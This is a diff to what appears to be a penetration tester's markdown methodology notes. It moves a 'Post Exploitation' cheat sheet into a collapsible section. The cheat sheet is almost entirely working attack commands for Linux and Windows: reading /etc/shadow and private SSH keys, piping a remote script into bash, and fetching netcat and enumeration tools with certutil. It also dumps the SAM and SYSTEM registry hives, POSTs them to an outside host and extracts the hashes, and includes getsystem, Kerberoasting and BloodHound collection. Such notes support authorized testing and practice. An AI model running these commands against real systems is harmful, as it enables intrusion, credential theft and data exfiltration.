@@ -90,52 +90,52 @@ My Methodology
     reset
 </details>
 
-
-
-Post Exploitation
-━━━━━━━━━━━━━━━━━━━━━━━━━
-[*] Linux
-ssh user@xxxxxxxxx -i id_rsa -L 33060:localhost:33060
-netstat -tuln
-ls -la /opt
-sudo -l
-find / -perm /4000 2>/dev/null
-grep -r -E 'conf' /var/www
-cat ~/.ssh/id_rsa
-cat /etc/shadow
-curl xxxxxxxxxx:8088/linpeas.sh | bash
-GTFO bins
-
-[*] Windows
-evil-winrm -i xxxxxxxxxx -u 'username' -p 'password'
-evil-winrm -i xxxxxxxxxx -u 'username' -H 'hash'
-cd C:\users
-tree /f
-powershell -c "certutil -urlcache -f http://xxxxxxxxxx:8088/winpeas.exe C:\programdata\winpeas.exe"
-powershell -c "certutil -urlcache -f http://xxxxxxxxxx:8088/nc.exe C:\programdata\nc.exe"
-
-click.url
-[InternetShortcut]
-URL=C:\programdata\shell.bat
-
-meterpreter > use priv
-meterpreter > getsystem
-
-nxc winrm xxxxxxxxxx -u 'username' -p 'password' -x \
-'
-powershell -c rm *.SAV
-powershell -c reg save HKLM\SYSTEM SYSTEM.SAV
-powershell -c reg save HKLM\SAM SAM.SAV
-powershell -c compress-archive *.SAV SAM.zip
-powershell -c dir
-iwr http://xxxxxxxxxx:xxxx -Method POST -InFile SAM.zip
-'; unzip -o SAM.zip; \
-impacket-secretsdump LOCAL -sam SAM.SAV -system SYSTEM.SAV
-
-powershell -c "certutil -urlcache -f http://xxxxxxxxxx:8088/powerview.ps1 C:\programdata\powerview.ps1"
-powershell Import-Module C:\programdata\powerview.ps1
-Get-NetDomain
-Get-LocalUser
-Set-DomainObject -Identity USERNAME -SET @{serviceprincipalname='SET/SET'}; Get-DomainSPNTicket -spn SET/SET
-bloodhound-python -c all -u 'username' -p 'password' -d "$domain" -dc "$dc" -ns "$target"
-bloodhound-python -c default -u 'username' -p 'password' -d "$domain" -dc "$dc" -ns "$target"
+<details>
+    <summary>Post Exploitation</summary>
+    
+    [*] Linux
+    ssh user@xxxxxxxxx -i id_rsa -L 33060:localhost:33060
+    netstat -tuln
+    ls -la /opt
+    sudo -l
+    find / -perm /4000 2>/dev/null
+    grep -r -E 'conf' /var/www
+    cat ~/.ssh/id_rsa
+    cat /etc/shadow
+    curl xxxxxxxxxx:8088/linpeas.sh | bash
+    GTFO bins
+    
+    [*] Windows
+    evil-winrm -i xxxxxxxxxx -u 'username' -p 'password'
+    evil-winrm -i xxxxxxxxxx -u 'username' -H 'hash'
+    cd C:\users
+    tree /f
+    powershell -c "certutil -urlcache -f http://xxxxxxxxxx:8088/winpeas.exe C:\programdata\winpeas.exe"
+    powershell -c "certutil -urlcache -f http://xxxxxxxxxx:8088/nc.exe C:\programdata\nc.exe"
+    
+    click.url
+    [InternetShortcut]
+    URL=C:\programdata\shell.bat
+    
+    meterpreter > use priv
+    meterpreter > getsystem
+    
+    nxc winrm xxxxxxxxxx -u 'username' -p 'password' -x \
+    '
+    powershell -c rm *.SAV
+    powershell -c reg save HKLM\SYSTEM SYSTEM.SAV
+    powershell -c reg save HKLM\SAM SAM.SAV
+    powershell -c compress-archive *.SAV SAM.zip
+    powershell -c dir
+    iwr http://xxxxxxxxxx:xxxx -Method POST -InFile SAM.zip
+    '; unzip -o SAM.zip; \
+    impacket-secretsdump LOCAL -sam SAM.SAV -system SYSTEM.SAV
+    
+    powershell -c "certutil -urlcache -f http://xxxxxxxxxx:8088/powerview.ps1 C:\programdata\powerview.ps1"
+    powershell Import-Module C:\programdata\powerview.ps1
+    Get-NetDomain
+    Get-LocalUser
+    Set-DomainObject -Identity USERNAME -SET @{serviceprincipalname='SET/SET'}; Get-DomainSPNTicket -spn SET/SET
+    bloodhound-python -c all -u 'username' -p 'password' -d "$domain" -dc "$dc" -ns "$target"
+    bloodhound-python -c default -u 'username' -p 'password' -d "$domain" -dc "$dc" -ns "$target"
+</details>
